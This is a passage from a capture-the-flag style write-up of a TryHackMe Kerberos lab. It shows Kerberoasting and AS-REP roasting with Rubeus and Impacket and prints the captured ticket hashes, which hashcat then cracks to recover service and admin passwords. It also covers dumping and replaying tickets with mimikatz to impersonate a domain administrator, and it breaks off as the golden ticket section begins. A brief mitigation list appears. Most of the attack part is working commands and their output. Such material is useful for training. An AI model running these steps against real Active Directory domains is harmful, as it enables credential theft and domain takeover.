\[_] SamAccountName : SQLService \[_] DistinguishedName : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local \[_] ServicePrincipalName : CONTROLLER-1/SQLService.CONTROLLER.local:30111 \[_] PwdLastSet : 5/25/2020 10:28:26 PM \[_] Supported ETypes : RC4\_HMAC\_DEFAULT \[_] Hash : $krb5tgs$23$_SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca l:30111_$3887495143547AA616749D24E73AC6D9$BA44F7A1F65DBC38A03C77BDACE4B9824476B1 6176FB1DD947A493657332C13D1860EE90945CA18F817CF0A1739E3B3296697554DC90D50CF08934 C91A04C7E844061735F2F64F90AAE920D3D0D585637337B54A6863740983754F69D330CA4463F00A 174D38DFCD4F811FAD8CEA40712628914FB2AA1B1FD48EEF041FCA20BD4FCF7E32692680085D4FAF EB56531A995FACDDF8BDF62F2C8447888B506AD1B46D3881AA033D01CA51641F3E32D9B411ED3011 48B59B819A0BCA16FC596577AE5DA29B16787B8298E71422AAB3F383B925859D2C96D4CDF2EB3B2C B37C5E2DBE11FCD6CF3BC34FEF2973A38CC360F7C36CD5C604EBCF7F09611D898F5D067329E464D5 D3085FD42CE45B0F4E2160C003784041BB75CA751BF38743EA515361B5FFE9954A20E5621EEA0EDA 0AE8528F2E9C9CB67A8DE3555E526570219B1874B3EE13259A79036D9BBE10C9A1271CE0AB386FE2 09B042D6CB1F68FBCEFEB71B0C9EAD8B57FD59D825900A9197E501DA9E00CB3B6E6468FBAB0D643F 17D01F4D4BDB64C036175A6DB694C1DEF6A26CDC499599D867550E57A52E5CBD6AFEA9E2EEB22A79 A7F0186A2D62C6AF7957A65E8FA7174E443DCE82D5E42CEFFE0D583C64739B5B856006C066BAA7D7 FFD725B94CE497869856467E1FB2060BE88B04B83127E36A2844366EE727995581A66A74FE1A9043 F8D902304F8942B64107A38046DCBCF1E2EC8520D6B0B32FB3A5000C338BE43C4C8EDB6B3EF29062 2A7CCD2E1325947CC04AD3E08934A1C87E95094C00D0E7AE85396C45F6AA5E5A452E60D2A8AD17AE A17A4D95E31A4784D5CFF674E0965DB61CD883318A9D8F0415CA5D5E230D9B07546CCDD283F6C4E0 211E25544D1A6189F80CFD7924CEF973C7248F5AA12ED02F4AE457BB7DDD3E7F5A5DCB33BE884B8E 5D3AA33145C354830161F23A5569578CFE2E7D451B6511CCB5EAD122E8CFED41BA9D97E6B6E66560 383D5B8F1A4CF7317403DD62A432266D7F95510BCC851EFFF423CF30314B6FC9F8DA0F849EE85E88 F76506473EF1AEBC93D788F4CDD9012063193E75A348EE21EBBF51395974D0DCCA6F10C87989129D 3B5A83062E9B9ADA11896953EBAE973E7C6E8C5355439277C0FB1FEA044AFD543652A8A32417CB57 E84C6A6D0426AF5D71E69060DB3D3ABB607908FF53224D8CABC108F70BFA0D75D7C9672A91A63697 51209F7B0056D34C4D20809F78AB704316E0A7192CB9513FB52F0FA808E832DCE8C298C53CD8FF6B 7EF5299E202D2B7D0BB05DFA4A85E2BFDD6D33B417932CFC0277CCD69E5CEF0C935FCCC5D0598C41 EBBB99C77839EAC8144FB90DDC4369F0315F8A3251DF91A3B24B7240668D96774E70752B1F4F3CA6 32FD4166ED2735E8E583F733E74CA7AC95DDFA7B7CF2B53B6EBE63CB9FD3451BCE0599A8C423E786 E8F2DFC05AD746A5C8B726CE2C440CC537AA28D143BF672390E2A13184CBEB502082A54E75717E77 80711369F59DC40CBE24BB3D39C829101874965AD1806CD9C293367C76C5AB244CE52260C7E3BB7C AED25AC434D150899B682956BEB9319BD2E70202112D3E1FD24651238155445C7C08678D48CB5319 8FD77E73FF2E920691E02867ED373BCDDFDCCC5FF801524E71BA86F2D0

\[_] SamAccountName : HTTPService \[_] DistinguishedName : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local \[_] ServicePrincipalName : CONTROLLER-1/HTTPService.CONTROLLER.local:30222 \[_] PwdLastSet : 5/25/2020 10:39:17 PM \[_] Supported ETypes : RC4\_HMAC\_DEFAULT \[_] Hash : $krb5tgs$23$_HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo cal:30222_$A20D0E9EF077384D9904B9F76A709F8D$04B422987DA26F80EAF12EA48C30241E9636 92B6D34E49F1830A1ECBDA67B0DD167DE6B1C09F74A068069CF7F93C277F201DCB34B242EECF53C4 C93C3E80B45F57208BF03EED641E343390AE99F7CFC65E6F9F942D52FC9AFE96E47D424C968B341F 28D0C65E6E7F884E43B8F97114B014AA769856BC777880E4E213C39D86B49819709971195BB8EE90 37F05A8DA19237C148D8376BF03DDC3AF5A77414D545142DEA835D16DF11B897C20412BA2D2041CE EBFF622B2CEBE3D24DB49451DA16221EC4E5A3CA7B3E3DA889BB655283EC9F4720FB95AA5781C0E5 53C03D928BF7FF4469926CF14DEDD2D93AAD1F06E586EF83EF165CA6D7FE5A3753C8F057D1D231AB A683AA26453107934DCD55D6B13E1C6015ACEBBAB04D26B5CD3E38C22EAC8F15CC40EC56FAE5CA4D EC21C5118C6243D3EDB67497D62F8BC3D54E00F3FE0F446A5DE4F398BC7454C898CE8D7C8880A0BF 78E7513A3276A07C1F5DEB82738BC8C71D4D98D8D246DE131D131E95D8451707ADC9D11DEB903387 36060D71F2B55ACF7F3E74F45A3BAA0148A106BDA575ACDAB6C95D064A7956C071E763BC5D7B4412 6085782AD923BAB05B628C7F9E3B6E875DE60855AAA99D8265469DD601D835F23CD12A44B2DFCA5A B39E4E459758E06A1EDBEFB12DA972119C580DA8A8705B6F08274B035214725AF765E7B963FC0448 34117395D802B804C4952214A9AE0F1C9F27B94686A6AC14E81DEB9F6F8B793988D765181F69C131 9BD34A6AC75112855A01C71D82CEF90556E086FA8D5F65D76FD1FC14AC333DCAE9511B29E5C9C170 A41C5E150BDEA591908A67196AB920253E921F8733441AFC300F9D1BDF6251F38FED788BC33D86EE 427DB3108104727309B320FB7171C96F638BBF94342F30088101B152549AC446DDAB436B97302D30 FF4334BFBAC9AFDF071A776A29AC4260E1A01614BE23029B575F34453DA3FDF86AA385D96A572383 0F2687664F5CA1F380B277263ADFD207A54CCA2A39D31D35DE48F132C4B0685253599C365C310F61 FEE6DEADB1D5471DEC01180BF07F31BAB196117B8948EB54513AC8DCDDC204D3443093522D11E88E 4911BED1FA6F9380BEB64AD363F01A0A7E344E82C6BA851EEFCE0693512F743E0DC9CB350FA1E2E4 5D6437EBBFE2568AFAF3146CFD618B1ADAD4D15FD14E04FC9417C30A18FDC1FDE296C95935842A88 F0F733A81EA8D917E8E9FCDF8662F7ADA83C8ACE8BD878346147B8102B874990B9EFED8F345CA613 B99B29F7982313F9C8FE228B6F0D8310D853B0EF851BAE5624483E159BD69D3697FD2ED64532409D 7C3F6A20F678CB9ECDB769D75371082B3A9AC5FD9258B484DB762E21657DFAD9289EB898E6B1BC2A 0AC1D62F7ED63243A543186E4944378372411843B80D092E5F2297DFEACB3D183086553AFA29E15A D5A68264422AE181D13968DD0B47D71CF975553F7621E7EFBBDA25C670EFDAE74A2CF48DF37CB03D DEF8BF8FADC3FB158A6FA97941BE285DA10326ABD1F6D9A09B466A5DFCC83A118E0CA4B4B437CA6E 5271BFFCF109CB00F9C0021DA2EBA57CDC5D4899FC034F9F9A4B95854614300E90952712B73305DC 7F44F3D47689355AD7D5B87EE554A3CD1856D270BE44AD6DB209142E4B35

</details>

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

in this case, we can copy only the SQL Service hash (we'll do the same for HTTP Service using another technique) into the attacker machine and put it into a .txt file so we can crack it with hashcat

<details>

<summary>hash.txt</summary>

$krb5tgs$23$_SQLService$CONTROLLER.LOCAL$controller.local/SQLService_$11635800a5f687ce55c952b72af3ebab$7718e61b826af8146845fa01862a6a2b8bf7c5592adf832094fb241a1633c141ecfed7b9d4fd8d2d4e394db34340dd0b1d9757f534052776b2a9ec2a073740017d0487e0de5b172e7568a38db7c7dc84976b7f33fbb5d4761f7df18763643212322da2de1c1690559fb599f71aca1f3159697e66e2f1fccf600a9f85e11ddbc2143bbe98d404ca2e72605594deb22aecd9c7c3ea59e38cb8f219a1ee96c0fab3a0ef8188e7f5f26012d7a6cc297dbe28c4cd1eaaa3d4025a742327e2dffebb184fe345b9bd7bf85d33dbe3afed9ae926415aed2476477636dcf92ec324b3872de8678900d8617f8003f21fe1098c497c60f37a4865046894906a74bba268b351556de3123aa3d8da96080c18826a3987d5495df4f18808c9f21e3793d245705304fb68ce37642af738657546b06a73c7319bb664e6c235fbccfb001550ee63e56310bc6cc6e9e7ddc0084f65e2a8d690e50fab779a1217a116621ae7bb0f73484697f87da1846024bb3c6c0b23a6bf9245b7bf8c7884c04355140cffc17d3a69e0cec408a7ec321697e61f207bfb98228b2e4aea23b1f9a782db691bd36e953b51f121d00416ef4583570eb5294103ef55237b13ebd0d0601c49343a7eba3b257c46cffe13ab87267d7ecbf1cab17a0bd791feddb115b9cd315e763f435da6c107ef83d6526205109e0a08a46815e3a15ff778106421ccd42f2078eb7487353afc1a38c166ee66c6afbdfc26fa26df4a5cc5ab51a7961e92fee4375b8136872c4742b4775a9b837fcc58130c6bc4357aae0cc3bf3087870b21c362498ad0e59555988827ff01dc6666ef96ffa8345d7de7ea37964899f4f90bf627efabfb62eccdcb6fe66bd4223e0e5f17b1412e453ab0eda03c5c048329ec001e86cba29f244c18f3ed604f2cdc34f06e1c1d0f38c68a5c6558f26c8de21c17645725e8b3d7b61b7b23691dfa19d12254dea6eb492d8dfa0ae6a9b8d6bbe66f54896dc09e881a47c316dbb2c88d99f662a97c689fd16ad6586095fa3064c33732bdd0dbe5ceb69f31bc91c6b34314f37811011a1a142551bb6a5be71a739251d9634cb3c6e5eb74b2b7649d716645ff5b9cbf39fb7f161e122cfb78f677324743b596732a29309ced6397a03019165b31661686ec41d38f11c86ea60d2a4414d02047e454f60d9c8a4f2ebe26abe2e606a3391de5791c14654099efb1ea40e4b6d5207737ea5e26a82efc6be6e5aae75afa0d3aafaae8f09fbdcfa8fe50b2d87ea3d567c5fbb818589609cfa7072080869fb4104491ba6fcd1361c388a597d84052386bb7213ed1d6c8828d5f7104ce90cb7b89ddce6fba6cf68caf127cad090e66b8c622fe183b0487bf98822f6805650622a17385e2 $krb5tgs$23$_HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService_$c854728c6da47e8b1d7edf80970f605c$34d6b1dc968a9f525cb5f9fe9e82809eea201d4b9764e04947e2a98a7466d1b2abafd3441955ff51412767b5402929e8a5f1e611b552b9dec136d47fa2df95e7173fa154ecdfeec8f1a2cc9c63c307cca49c107705990882bac80caf69e3fe934e9fba3bf82d0f30f709c0d851ccf4df1798aa748fa33d14518d73a2a28ae62336e28d210baf3598ab50285eb0dd90d6042e3f1a215327cb489af19581ac0bd588e80e124dea35f527d23a92c0b5c6b465e8ebe9a1c6a3cd1175bf3d2be623709c7afac5a4243628e94e2e14d50eb5733cc2dbd39fc98a9e627d6baeb047921375d6b4867920982398939011d3125f0f5f94b6cb14d8a5ca84a66db11db83cccbba28dbf534e6c9f84807c33201c631137d801fc99fff11e7b47ce078bf0b26a71561c722127fcf56a0c220a54ffb416e6ba5947437058494a9a25d60612912561b8d00a9fd4b4b9a4249029f136e45039793da681e7de1679ad59cdcb054d511b92c3c9345aa13f24779a3d62c75d0343f9e29da0a18492ae0ecdb24107ab2e5d54a386aa722d8c6112e56fe4c69193732acb064b6bcdb54d50c11343e858c1040f09a6a15c92d4ac34be99d72e8ba632c9ea31bf3310d30a558b695cb1b1c24e9fbebf1860f83f686997cec5800bc14826993198d3493ddd6b367cf9c5f732df504c4fa7a7949db527c12805c44dc54540a539dd5006d5fe2eb9f0acfb2d7595fed689fa018c19e16e53c7fc90b11f353feacf3b6d18e7d6040af3f279fd358f50860f09ba5181d9c4cb6f01cffc87e014f8d3ad493370354153062fe6b29fc48e229afafded78fd04b76a02a986ea09948621e415f08b2e83a908938343c0b56f0faf50a8a432e59a5802dc12c45484b1725be1fea7f39fb55121e327780afcd230b31648ea63bbf1c160eeedd10e65ea22720fe1cd544336f8ba7951a0a2f1a6c4ac942742d4add1318ed473076bb5c3405f6b838b10c0b32ac3f61e0b689ef3a4f90fa86f53006698e7ff02c0d8d906c1d2fdf7ff390401b38db288fff4b64be2ac77efb1ebd723bd8a305af2a57c6ec5f3714ea397e76b575aa4876cd7de31841f5e519dcb254a9c4ce498f1c48e88e767907f27ac082f4f11ea5cd7c43df5db183a49c9c3bdb01de47b372923c884a1d206e9de5a57215c83436ff846ae511f26d7ae690fb86364b24c37c8f3387c767476cbbc66733570b2b35f5422a5b14add2a25fbcbcb720c9183d059f4958ad2d127953f3ae548afb22ea3349094f9575170fb325591bffe0b19f1fbe4add2ce7bfc1c7a1ea3455181554495abe659e87ab0bbc9bc69cc6565bcd4b98a3bb44d42907f29ebb46abfe83210431f5b3673bdcef0a658bb4b7562ddbbe2e484

</details>

THM provide us a modified rockyou wordlist in order to speed up the process download it [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt)&#x20;

Checking hashcat [documentation](https://hashcat.net/wiki/doku.php?id=example_hashes) we can search our format and the relative parameter:

`13100 Kerberos 5, etype 23, TGS-REP`

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

`hashcat -m 13100 -a 0 hash.txt pass.txt`

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
MYPassword123#
{% endhint %}

### 4.1 - What is the HTTPService Password?

#### [Impacket](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19) (Method 2)

```bash
sudo python3 /home/kali/.local/bin/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.68.235 -request
```

<details>

<summary>Output of "sudo python3 /home/kali/.local/bin/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.68.235 -request" command</summary>

```
sudo python3 /home/kali/.local/bin/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.68.235 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-25 18:28:26.922527  2020-05-25 18:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-25 18:39:17.578393  2020-05-25 18:40:14.671872             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$11635800a5f687ce55c952b72af3ebab$7718e61b826af8146845fa01862a6a2b8bf7c5592adf832094fb241a1633c141ecfed7b9d4fd8d2d4e394db34340dd0b1d9757f534052776b2a9ec2a073740017d0487e0de5b172e7568a38db7c7dc84976b7f33fbb5d4761f7df18763643212322da2de1c1690559fb599f71aca1f3159697e66e2f1fccf600a9f85e11ddbc2143bbe98d404ca2e72605594deb22aecd9c7c3ea59e38cb8f219a1ee96c0fab3a0ef8188e7f5f26012d7a6cc297dbe28c4cd1eaaa3d4025a742327e2dffebb184fe345b9bd7bf85d33dbe3afed9ae926415aed2476477636dcf92ec324b3872de8678900d8617f8003f21fe1098c497c60f37a4865046894906a74bba268b351556de3123aa3d8da96080c18826a3987d5495df4f18808c9f21e3793d245705304fb68ce37642af738657546b06a73c7319bb664e6c235fbccfb001550ee63e56310bc6cc6e9e7ddc0084f65e2a8d690e50fab779a1217a116621ae7bb0f73484697f87da1846024bb3c6c0b23a6bf9245b7bf8c7884c04355140cffc17d3a69e0cec408a7ec321697e61f207bfb98228b2e4aea23b1f9a782db691bd36e953b51f121d00416ef4583570eb5294103ef55237b13ebd0d0601c49343a7eba3b257c46cffe13ab87267d7ecbf1cab17a0bd791feddb115b9cd315e763f435da6c107ef83d6526205109e0a08a46815e3a15ff778106421ccd42f2078eb7487353afc1a38c166ee66c6afbdfc26fa26df4a5cc5ab51a7961e92fee4375b8136872c4742b4775a9b837fcc58130c6bc4357aae0cc3bf3087870b21c362498ad0e59555988827ff01dc6666ef96ffa8345d7de7ea37964899f4f90bf627efabfb62eccdcb6fe66bd4223e0e5f17b1412e453ab0eda03c5c048329ec001e86cba29f244c18f3ed604f2cdc34f06e1c1d0f38c68a5c6558f26c8de21c17645725e8b3d7b61b7b23691dfa19d12254dea6eb492d8dfa0ae6a9b8d6bbe66f54896dc09e881a47c316dbb2c88d99f662a97c689fd16ad6586095fa3064c33732bdd0dbe5ceb69f31bc91c6b34314f37811011a1a142551bb6a5be71a739251d9634cb3c6e5eb74b2b7649d716645ff5b9cbf39fb7f161e122cfb78f677324743b596732a29309ced6397a03019165b31661686ec41d38f11c86ea60d2a4414d02047e454f60d9c8a4f2ebe26abe2e606a3391de5791c14654099efb1ea40e4b6d5207737ea5e26a82efc6be6e5aae75afa0d3aafaae8f09fbdcfa8fe50b2d87ea3d567c5fbb818589609cfa7072080869fb4104491ba6fcd1361c388a597d84052386bb7213ed1d6c8828d5f7104ce90cb7b89ddce6fba6cf68caf127cad090e66b8c622fe183b0487bf98822f6805650622a17385e2
$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$c854728c6da47e8b1d7edf80970f605c$34d6b1dc968a9f525cb5f9fe9e82809eea201d4b9764e04947e2a98a7466d1b2abafd3441955ff51412767b5402929e8a5f1e611b552b9dec136d47fa2df95e7173fa154ecdfeec8f1a2cc9c63c307cca49c107705990882bac80caf69e3fe934e9fba3bf82d0f30f709c0d851ccf4df1798aa748fa33d14518d73a2a28ae62336e28d210baf3598ab50285eb0dd90d6042e3f1a215327cb489af19581ac0bd588e80e124dea35f527d23a92c0b5c6b465e8ebe9a1c6a3cd1175bf3d2be623709c7afac5a4243628e94e2e14d50eb5733cc2dbd39fc98a9e627d6baeb047921375d6b4867920982398939011d3125f0f5f94b6cb14d8a5ca84a66db11db83cccbba28dbf534e6c9f84807c33201c631137d801fc99fff11e7b47ce078bf0b26a71561c722127fcf56a0c220a54ffb416e6ba5947437058494a9a25d60612912561b8d00a9fd4b4b9a4249029f136e45039793da681e7de1679ad59cdcb054d511b92c3c9345aa13f24779a3d62c75d0343f9e29da0a18492ae0ecdb24107ab2e5d54a386aa722d8c6112e56fe4c69193732acb064b6bcdb54d50c11343e858c1040f09a6a15c92d4ac34be99d72e8ba632c9ea31bf3310d30a558b695cb1b1c24e9fbebf1860f83f686997cec5800bc14826993198d3493ddd6b367cf9c5f732df504c4fa7a7949db527c12805c44dc54540a539dd5006d5fe2eb9f0acfb2d7595fed689fa018c19e16e53c7fc90b11f353feacf3b6d18e7d6040af3f279fd358f50860f09ba5181d9c4cb6f01cffc87e014f8d3ad493370354153062fe6b29fc48e229afafded78fd04b76a02a986ea09948621e415f08b2e83a908938343c0b56f0faf50a8a432e59a5802dc12c45484b1725be1fea7f39fb55121e327780afcd230b31648ea63bbf1c160eeedd10e65ea22720fe1cd544336f8ba7951a0a2f1a6c4ac942742d4add1318ed473076bb5c3405f6b838b10c0b32ac3f61e0b689ef3a4f90fa86f53006698e7ff02c0d8d906c1d2fdf7ff390401b38db288fff4b64be2ac77efb1ebd723bd8a305af2a57c6ec5f3714ea397e76b575aa4876cd7de31841f5e519dcb254a9c4ce498f1c48e88e767907f27ac082f4f11ea5cd7c43df5db183a49c9c3bdb01de47b372923c884a1d206e9de5a57215c83436ff846ae511f26d7ae690fb86364b24c37c8f3387c767476cbbc66733570b2b35f5422a5b14add2a25fbcbcb720c9183d059f4958ad2d127953f3ae548afb22ea3349094f9575170fb325591bffe0b19f1fbe4add2ce7bfc1c7a1ea3455181554495abe659e87ab0bbc9bc69cc6565bcd4b98a3bb44d42907f29ebb46abfe83210431f5b3673bdcef0a658bb4b7562ddbbe2e484

```

</details>

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

in this case, we can copy only the HTTP Service hash (because SQL Service was already done using the other technique) into the attacker machine and put it into a .txt file so we can crack it with hashcat

<details>

<summary>hash.txt</summary>

$krb5tgs$23$_HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService_$c854728c6da47e8b1d7edf80970f605c$34d6b1dc968a9f525cb5f9fe9e82809eea201d4b9764e04947e2a98a7466d1b2abafd3441955ff51412767b5402929e8a5f1e611b552b9dec136d47fa2df95e7173fa154ecdfeec8f1a2cc9c63c307cca49c107705990882bac80caf69e3fe934e9fba3bf82d0f30f709c0d851ccf4df1798aa748fa33d14518d73a2a28ae62336e28d210baf3598ab50285eb0dd90d6042e3f1a215327cb489af19581ac0bd588e80e124dea35f527d23a92c0b5c6b465e8ebe9a1c6a3cd1175bf3d2be623709c7afac5a4243628e94e2e14d50eb5733cc2dbd39fc98a9e627d6baeb047921375d6b4867920982398939011d3125f0f5f94b6cb14d8a5ca84a66db11db83cccbba28dbf534e6c9f84807c33201c631137d801fc99fff11e7b47ce078bf0b26a71561c722127fcf56a0c220a54ffb416e6ba5947437058494a9a25d60612912561b8d00a9fd4b4b9a4249029f136e45039793da681e7de1679ad59cdcb054d511b92c3c9345aa13f24779a3d62c75d0343f9e29da0a18492ae0ecdb24107ab2e5d54a386aa722d8c6112e56fe4c69193732acb064b6bcdb54d50c11343e858c1040f09a6a15c92d4ac34be99d72e8ba632c9ea31bf3310d30a558b695cb1b1c24e9fbebf1860f83f686997cec5800bc14826993198d3493ddd6b367cf9c5f732df504c4fa7a7949db527c12805c44dc54540a539dd5006d5fe2eb9f0acfb2d7595fed689fa018c19e16e53c7fc90b11f353feacf3b6d18e7d6040af3f279fd358f50860f09ba5181d9c4cb6f01cffc87e014f8d3ad493370354153062fe6b29fc48e229afafded78fd04b76a02a986ea09948621e415f08b2e83a908938343c0b56f0faf50a8a432e59a5802dc12c45484b1725be1fea7f39fb55121e327780afcd230b31648ea63bbf1c160eeedd10e65ea22720fe1cd544336f8ba7951a0a2f1a6c4ac942742d4add1318ed473076bb5c3405f6b838b10c0b32ac3f61e0b689ef3a4f90fa86f53006698e7ff02c0d8d906c1d2fdf7ff390401b38db288fff4b64be2ac77efb1ebd723bd8a305af2a57c6ec5f3714ea397e76b575aa4876cd7de31841f5e519dcb254a9c4ce498f1c48e88e767907f27ac082f4f11ea5cd7c43df5db183a49c9c3bdb01de47b372923c884a1d206e9de5a57215c83436ff846ae511f26d7ae690fb86364b24c37c8f3387c767476cbbc66733570b2b35f5422a5b14add2a25fbcbcb720c9183d059f4958ad2d127953f3ae548afb22ea3349094f9575170fb325591bffe0b19f1fbe4add2ce7bfc1c7a1ea3455181554495abe659e87ab0bbc9bc69cc6565bcd4b98a3bb44d42907f29ebb46abfe83210431f5b3673bdcef0a658bb4b7562ddbbe2e484:Summer2020

</details>

THM provide us a modified rockyou wordlist in order to speed up the process download it [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt)&#x20;

`hashcat -m 13100 -a 0 hash.txt pass.txt`

{% hint style="info" %}
Summer2020
{% endhint %}

#### Kerberoasting Mitigation

* &#x20;Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
* &#x20;Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

## Task 5 - AS-REP Roasting w/ Rubeus

Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

#### Dumping KRBASREP5 Hashes w/ Rubeus

```bash
Rubeus.exe asreproast
```

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>Output of "Rubeus.exe asreproast" command</summary>



Rubeus.exe asreproast

***

(\_\_\_\_\_ \ | | _**) ) | | \_\_\_\_\_ \_ \_ \_\_\_ | \_\_ /| | | | \_ | \_\_\_ | | | |/**_) | | \ | |_| | |_) ) _**| || |**_ | |_| |_|**/|**/|\_\_\_\_\_)\_\_**/(**\_/

v1.5.0

\[\*] Action: AS-REP roasting

\[\*] Target Domain : CONTROLLER.local

\[_] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users \[_] SamAccountName : Admin2 \[_] DistinguishedName : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local \[_] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::e948:aaa:33c4:27a4%5) \[_] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2' \[+] AS-REQ w/o preauth successful! \[_] AS-REP hash:

```
  $krb5asrep$Admin2@CONTROLLER.local:99F6E48A9510EF721FC5BA2C2329BEF2$45D4A8331128
  0CAC7D93FE02958A44A864F48EB7AD43EBD35BDA732E881968AF042307D4C4F1C1F722A2F67D7E35
  D775329F3AA95D08F2EC968F6AD416BE3B7C1513AB7A7F8171FACC22B3C038EB8BA90049438A4074
  0B94E05DF465B9A438F409B80216EE1C5086D9621A380D1DF6653AF9A0F90B6EA7B8D860A8265F2B
  478C4130BC3CEBB4A183CF7D21D4CA489EDF6AED4943201518A1DF1B9EA0E5CCA4A6F6384984F7F7
  DBE83696E19C8AEC95F0545A475B1E08473139A5C6513E32CBB57BA03AC253DE6154ED47D3751101
  3F88F9B088D3ECCAE9D84E2C3320E685EA71798051212A4779B7CED1EC1BD9DDC931DDE4891D
```

\[_] SamAccountName : User3 \[_] DistinguishedName : CN=User-3,CN=Users,DC=CONTROLLER,DC=local \[_] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::e948:aaa:33c4:27a4%5) \[_] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3' \[+] AS-REQ w/o preauth successful! \[\*] AS-REP hash:

```
  $krb5asrep$User3@CONTROLLER.local:6BF1C4FFA29E81FEDF7F2AEF2EA7CD4C$6E393061A23E6
  F8994442A80AD8E57908452B5849A0D444445964497A1084165D9A91DC1D8232D23D2C2236444427
  ACFDA2EFA698CAEFB20E489DC28C811DA72BD68EC0278AB466BE615C298B574F83E527EBE6ED37E8
  D6F5775E2D21B316E34A2F494354533772B708C31C2D7D40F2B0A04702DA28BB98A4080EFD62CA77
  5D22B20B5E6D99F157157686FA22B2FCDA506BD2203F586F63DDB63A3B735764FF36E90B101B61FD
  A31E9473A5EE5457AC583F6801D83D94DB4D9EADB6C6C7ADC11047B136D11CE78A93BA5CB7266157
  3E31D6C159F771C525B13BAD175E11C0A46F2C28C20F5F9122F4DEAAD14C7E36FF93AC29563
```

</details>

in this case we need to specify the parameter `18200` and the same wordlist as the previous task:

```bash
hashcat -m 18200 -a 0 hash.txt pass.txt
```

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

### 5.1 - What hash type does AS-REP Roasting use?

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Kerberos 5 AS-REP etype 23**
{% endhint %}

### 5.2 - Which User is vulnerable to AS-REP Roasting?&#x20;

{% hint style="info" %}
User3
{% endhint %}

### 5.3 - What is the User's Password?

{% hint style="info" %}
Password3
{% endhint %}

### 5.4 - Which Admin is vulnerable to AS-REP Roasting?

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Admin2
{% endhint %}

### 5.5 - What is the Admin's Password?&#x20;

{% hint style="info" %}
P@\$$W0rd2
{% endhint %}

## Task 6 - Pass the Ticket w/ mimikatz

#### Pass the Ticket Overview

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

![](https://i.imgur.com/V6SOlll.png)

#### Prepare Mimikatz & Dump Tickets

We can run mimikatz.exe, assure that the output of privilege::debug is '20' OK `mimikatz.exe` - run mimikatz

```
mimikatz.exe
privilege::debug
```

<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

Now we need to export the .kirbi tickets into the directory that you are currently in

```bash
sekurlsa::tickets /export
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

#### Pass the Ticket w/ Mimikatz

\
Now, we need to choose an administrator ticket from the krbtgt for impersonification step and cache it to impersonate administrator:

```bash
kerberos::ptt [0;444c7]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Using `klist` command we're able to verify that we successfully impersonated the ticket.

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## Task 7 - Golden/Silver Ticket Attacks w/ mimikatz

#### KRBTGT Overview&#x20;

A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

#### Golden/Silver Ticket Attack Overview -&#x20;

